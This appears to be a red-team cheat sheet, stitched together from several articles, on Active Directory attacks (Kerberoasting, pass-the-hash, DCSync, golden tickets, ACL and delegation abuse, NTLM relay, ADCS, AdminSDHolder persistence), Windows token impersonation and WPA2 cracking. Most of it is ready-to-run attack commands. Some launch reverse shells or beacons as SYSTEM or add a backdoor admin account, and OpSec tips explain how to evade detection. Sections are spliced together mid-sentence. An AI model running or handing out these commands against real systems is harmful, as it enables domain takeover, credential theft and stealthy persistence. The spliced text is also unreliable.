target.local/user:password -dc-ip 10.0.0.1 -request -outputfile krb5tgs.txt\n\n# Rubeus (Windows)\nRubeus.exe kerberoast /outfile:kerberoast.txt /stats # stats first to identify targets\nRubeus.exe kerberoast /user:svc_sql /outfile:targeted.txt # targeted to reduce noise\n```\n\nCrack with hashcat: `hashcat -m 13100 krb5tgs.txt wordlist.txt -r rules/dive.rule` (RC4) or `-m 19700` (AES).\n\n**OpSec**: Target specific high-value service accounts rather than requesting all SPNs. RC4 tickets are faster to crack but AES requests are more common in modern environments.\n\n## ASREPRoasting\n\nTarget accounts with \"Do not require Kerberos preauthentication\" enabled:\n\n```bash\nGetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -format hashcat -outputfile asrep.txt\n```\n\nCrack: `hashcat -m 18200 asrep.txt wordlist.txt`\n\n## Pass-the-Hash / Pass-the-Ticket\n\n**PtH** (use NTLM hash without cracking):\n```bash\npsexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\nwmiexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\ncrackmapexec smb 10.0.0.5 -u admin -H NTLM_HASH -x 'whoami'\n```\n\n**PtT** (use Kerberos ticket):\n```bash\n# Export ticket\nRubeus.exe dump /luid:0x12345 /service:krbtgt\n\n# Import and use\nexport KRB5CCNAME=ticket.ccache\npsexec.py -k -no-pass target.local/admin@dc01.target.local\n```\n\n**Overpass-the-Hash**: Use NTLM hash to request a Kerberos TGT:\n```\nRubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt\n```\n\n## DCSync\n\nWith Replicating Directory Changes (All) permissions (Domain Admins, DC machine accounts, or explicitly granted):\n\n```bash\n# Impacket\nsecretsdump.py target.local/admin:password@dc01.target.local\n\n# Mimikatz\nlsadump::dcsync /domain:target.local /user:krbtgt\nlsadump::dcsync /domain:target.local /all /csv\n```\n\n## Golden Ticket\n\nForge TGTs using the krbtgt hash (obtained via DCSync):\n\n```\n# Mimikatz\nkerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:HASH /ptt\n\n# Impacket\nticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain target.local Administrator\nexport KRB5CCNAME=Administrator.ccache\n```\n\nGolden tickets survive password resets for all accounts except krbtgt. Valid for 10 years by default. krbtgt password must be reset twice to invalidate (due to password history).\n\n## Silver Ticket\n\nForge TGS for specific services using the service account's NTLM hash:\n\n```\n# Forge CIFS ticket for file share access\nticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain target.local -spn cifs/fileserver.target.local Administrator\n```\n\nLess detectable than Golden Tickets since no TGT is requested from the DC.\n\n## DACL / ACL Abuse\n\nBloodHound identifies exploitable permissions:\n\n- **GenericAll**: Full control — reset password, add to group, write SPN, modify DACL\n- **GenericWrite**: Write any attribute — add SPN (Kerberoast), modify logon script, set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)\n- **WriteDACL**: Modify permissions — grant yourself GenericAll\n- **WriteOwner**: Take ownership — then grant yourself WriteDACL\n- **ForceChangePassword**: Reset user password without knowing current\n- **AddMember**: Add yourself to a group (including Domain Admins if you have AddMember on it)\n- **AllExtendedRights**: Includes ForceChangePassword and credential reading (LAPS)\n\n```powershell\n# PowerView examples\n# Add user to group\nAdd-DomainGroupMember -Identity \"Domain Admins\" -Members \"attacker\" -Credential $cred\n\n# Set SPN for Kerberoasting\nSet-DomainObject -Identity targetuser -SET @{servicePrincipalName='http/fake'}\n\n# Force password change\nSet-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)\n```\n\n## Delegation Abuse\n\n**Unconstrained Delegation**: The server can impersonate any user who authenticates to it. Coerce a DC to authenticate (PrinterBug/PetitPotam), capture its TGT, use for DCSync.\n\n**Constrained Delegation (S4U2proxy)**: Compromise the delegated service account, then use S4U2self + S4U2proxy to impersonate any user to the allowed service.\n\n**Resource-Based Constrained Delegation (RBCD)**: If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object:\n\n```bash\n# Add controlled computer account\naddcomputer.py target.local/user:password -computer-name FAKE$ -computer-pass FakePass123\n# Set RBCD\nrbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -action write target.local/user:password\n# S4U attack\ngetST.py -spn cifs/target.target.local -impersonate Administrator target.local/FAKE$:FakePass123\n```\n\n## NTLM Relay\n\n```bash\n# Capture and relay with Responder + ntlmrelayx\nresponder -I eth0 -wFb\nntlmrelayx.py -tf targets.txt -smb2support\n\n# Relay to LDAP for RBCD or shadow credentials\nntlmrelayx.py -t ldap://dc01.target.local --delegate-access --escalate-user attacker\n\n# PetitPotam coercion\nPetitPotam.py attacker_ip dc01.target.local\n```\n\n## ADCS Attacks (ESC1-ESC8)\n\nSee dedicated ADCS article for full coverage. Quick reference:\n\n```bash\n# Enumerate vulnerable templates\ncertipy find -u user@target.local -p password -dc-ip 10.0.0.1 -vulnerable\n\n# ESC1: Request cert as DA\ncertipy req -u user@target.local -p password -ca TARGET-CA -template VulnTemplate -upn administrator@target.local\n\n# ESC8: NTLM relay to ADCS HTTP endpoint\nntlmrelayx.py -t http://ca.target.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n```\n\n## Shadow Credentials\n\nWrite to msDS-KeyCredentialLink attribute to add authentication credential:\n\n```bash\n# pywhisker\npywhisker.py -d target.local -u attacker -p password --target dc01$ --action add\n\n# Then authenticate with the certificate\ncertipy auth -pfx generated.pfx -dc-ip 10.0.0.1\n```\n\n## OpSec Notes\n\n- DCSync generates Event 4662 with specific GUIDs — avoid unless you have confirmed detection gaps\n- Kerberoasting a single targeted account is quieter than all SPNs\n- Golden/Silver tickets bypass normal authentication logging — detected by TGS without prior TGT (Event 4769 without 4768)\n- RBCD attacks require machine account creation (Event 4741) — use existing owned computer accounts when possible\n- NTLM relay can be disruptive — ensure relay targets are valid to avoid lockouts\n\n---\n\n## AdminSDHolder Persistence\n\nAdminSDHolder is a template object — every 60 minutes, SD Propagator (SDProp) copies its ACL to all protected groups (Domain Admins, etc.). Abuse it for stealthy persistence:\n\n```powershell\n# Add attacker user to AdminSDHolder ACL (requires Domain Admin)\n# Next SDProp run grants attacker full control over all protected AD objects\n\n# PowerView: grant GenericAll on AdminSDHolder\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" \\\n -PrincipalIdentity attacker -Rights All\n\n# Force SDProp immediately (don't wait 60 min)\nInvoke-SDPropagator -showProgress -timeoutMinutes 1\n\n# Verify: attacker now has GenericAll on Domain Admins group\n# → can add self to DA at any time even after initial removal\n# → highly persistent, hard to detect/remove\n\n# Detection: monitor ACL changes on AdminSDHolder (Event 5136 — AD object modified)\n```\n\n---\n\n## LAPS Abuse\n\nLocal Administrator Password Solution (LAPS) stores randomized local admin passwords in AD (ms-mcs-admpwd attribute):\n\n```powershell\n# Who can read LAPS passwords? Token Impersonation\n\nWindows access tokens control process security context. Manipulating tokens enables privilege escalation and lateral movement.\n\n## Token Fundamentals\n\nWindows uses two token types:\n- **Primary token**: Assigned to a process, defines its security context\n- **Impersonation token**: Allows a thread to temporarily adopt another security context (4 levels: Anonymous, Identification, Impersonation, Delegation)\n\nOnly Impersonation and Delegation level tokens allow actual resource access as the impersonated user.\n\n## Key Token Privileges\n\n| Privilege | Abuse Vector |\n|-----------|-------------|\n| SeImpersonatePrivilege | Potato family attacks, named pipe impersonation |\n| SeAssignPrimaryTokenPrivilege | Create processes with alternate token (CreateProcessAsUser) |\n| SeDebugPrivilege | Access any process memory (dump LSASS, inject into SYSTEM processes) |\n| SeLoadDriverPrivilege | Load kernel driver (load vulnerable driver for kernel exploitation) |\n| SeRestorePrivilege | Write to any file regardless of ACL (overwrite system files) |\n| SeTakeOwnershipPrivilege | Take ownership of any object (modify DACLs on protected resources) |\n| SeTcbPrivilege | Act as part of the operating system (create tokens with any SID) |\n| SeBackupPrivilege | Read any file regardless of ACL (extract SAM/SYSTEM/NTDS.dit) |\n| SeCreateTokenPrivilege | Create arbitrary tokens |\n\nCheck current privileges:\n```cmd\nwhoami /priv\n```\n\n## Potato Attack Chain\n\nThe Potato family exploits SeImpersonatePrivilege by tricking a SYSTEM-level service into authenticating to an attacker-controlled named pipe, then impersonating that token.\n\n**Attack flow**:\n1. Attacker creates a local COM server or named pipe\n2. A SYSTEM service is coerced into connecting/authenticating\n3. The service's token is captured on the attacker's endpoint\n4. ImpersonateNamedPipeClient() or similar call captures the token\n5. CreateProcessWithTokenW() spawns a new process as SYSTEM\n\n**PrintSpoofer** exploits the Print Spooler's pipe impersonation:\n```cmd\n# Interactive SYSTEM shell\nPrintSpoofer64.exe -i -c cmd.exe\n\n# Execute command as SYSTEM\nPrintSpoofer64.exe -c \"C:\\temp\\beacon.exe\"\n```\n\n**GodPotato** works on Windows Server 2022 and Windows 11 where older Potatoes fail:\n```cmd\nGodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c C:\\temp\\reverse_shell.exe\"\n```\n\n**SweetPotato** combines multiple techniques (PrintSpoofer + EfsPotato + others) with automatic selection.\n\n## Named Pipe Impersonation\n\nService accounts (NETWORK SERVICE, LOCAL SERVICE) can create named pipes and impersonate connecting clients:\n\n```\n# Flow: NETWORK SERVICE → create pipe → coerce SYSTEM connection → impersonate → SYSTEM\n\n# Meterpreter getsystem uses three techniques:\ngetsystem -t 1 # Named pipe impersonation (service creates pipe, injects DLL into SYSTEM service)\ngetsystem -t 2 # Named pipe impersonation (using technique 1 variant)\ngetsystem -t 3 # Token duplication\n```\n\n## Incognito / Token Manipulation\n\n**Incognito** (standalone or Meterpreter module) lists and impersonates available tokens:\n\n```\n# Meterpreter\nload incognito\nlist_tokens -u # List available user tokens\nlist_tokens -g # List available group tokens\nimpersonate_token \"DOMAIN\\\\Admin\" # Impersonate a token\nrev2self # Revert to original token\n```\n\nDelegation tokens exist when a user has an interactive logon session. Impersonation tokens persist after logoff until the system reboots.\n\n## Token Manipulation via API\n\n```\n# Conceptual flow for token theft\n1. OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid)\n2. OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)\n3. DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)\n4. CreateProcessWithTokenW(hDupToken, 0, NULL, \"cmd.exe\", CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)\n```\n\n**SeDebugPrivilege** allows opening any process regardless of its security descriptor, enabling token theft from SYSTEM processes like `winlogon.exe`.\n\n## RunAs Techniques\n\n```cmd\n# RunAs with known credentials (creates new logon session with fresh token)\nrunas /user:DOMAIN\\admin cmd.exe\n\n# RunAsCs (C# RunAs replacement with more features)\nRunasCs.exe admin password cmd.exe\n\n# PowerShell credential-based execution\n$cred = New-Object System.Management.Automation.PSCredential(\"DOMAIN\\admin\", (ConvertTo-SecureString \"password\" -AsPlainText -Force))\nStart-Process cmd.exe -Credential $cred\n```\n\n## Token Binding and Protections\n\nModern protections against token abuse:\n- **Credential Guard**: Isolates LSASS in a Virtualization Based Security (VBS) enclave — tokens from CG-protected logons cannot be stolen via traditional LSASS dump\n- **Protected Users group**: Disables NTLM, WDigest, and delegation for members — limits token availability\n- **Token Binding** (rare): Cryptographically binds tokens to the TLS channel\n- **Admin Approval Mode**: Even admin accounts get filtered tokens by default (UAC)\n- **Remote Credential Guard**: Prevents credential delegation over RDP\n\n## OpSec Notes\n\n- Token impersonation via Potato attacks generates Windows Event 4688 (process creation) under SYSTEM context\n- SeDebugPrivilege usage is logged and monitored by EDRs\n- Incognito token listing generates handle enumeration activity detectable by behavioral analysis\n- Prefer token impersonation over credential dumping when possible — less detection surface\n- Named pipe creation is logged in Sysmon Event 17/18 — use legitimate pipe names\n\n## Detection Notes\n\nEDRs monitor: OpenProcess calls with PROCESS_QUERY_INFORMATION on LSASS, DuplicateTokenEx calls, CreateProcessWithTokenW from unusual parents, SeDebugPrivilege enablement, and named pipe creation patterns consistent with Potato attacks.\n\n---\n\n## EfsPotato / CoercedPotato (2024–2026)\n\nNewer Potato variants that work on fully patched Windows Server 2022 / Windows 11:\n\n```powershell\n# EfsPotato: abuses EFS (Encrypting File System) RPC for impersonation\n# Works on: Windows 10/11, Server 2016–2022 where EFS service runs\n# Download: github.com/zcgonvh/EfsPotato\n.\\EfsPotato.exe \"cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add\"\n\n# CoercedPotato: uses PetitPotam/MS-EFSRPC Modern attacks combine efficient handshake capture with GPU-accelerated cracking.\n\n## WPA2 4-Way Handshake Capture\n\nThe WPA2 4-way handshake contains enough information to verify password guesses offline:\n\n```bash\n# Step 1: Put adapter in monitor mode\nsudo airmon-ng check kill\nsudo airmon-ng start wlan0 # creates wlan0mon\n\n# Step 2: Find target AP\nsudo airodump-ng wlan0mon\n# Note: client deauth needed:\n\n```\nPMKID = HMAC-SHA1-128(PMK, \"PMK Name\" || AP_MAC || Client_MAC)\nPMK = PBKDF2-SHA1(Password, SSID, 4096, 32)\n→ If we have PMKID + know SSID + AP/Client MACs → offline crack\n```\n\n```bash\n# Step 1: Capture PMKID\nsudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng \\\n --enable_status=1 \\\n --active_beacon \\\n --disable_deauthentication\n\n# Target specific EAPOL)\nsudo hcxpcapngtool -o /tmp/hash.hc22000 /tmp/pmkid.pcapng\n\n# Step 3: Crack\nhashcat -m 22000 /tmp/hash.hc22000 /usr/share/wordlists/rockyou.txt\n```\n\n---\n\n## Hashcat WPA Cracking\n\n###
